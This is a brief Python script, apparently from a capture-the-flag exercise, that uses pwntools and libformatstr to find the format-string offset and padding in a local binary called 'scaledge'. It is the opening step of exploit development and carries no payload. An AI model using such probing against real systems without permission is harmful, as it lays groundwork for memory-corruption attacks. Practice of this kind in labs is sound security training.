#!/usr/bin/python
from libformatstr import *
from pwn import *
import sys

buffsize = 100
buffer = ""
r = process ('./scaledge', env = {'LD_PRELOAD' : './libc-2.23.so'})

r.send (make_pattern (buffsize) + '\n')
data = r.recv ()
offset, padding = guess_argnum (data, buffsize)
log.info ("Offset  : " + str (offset))
log.info ("Padding : " + str (padding))
r.close ()
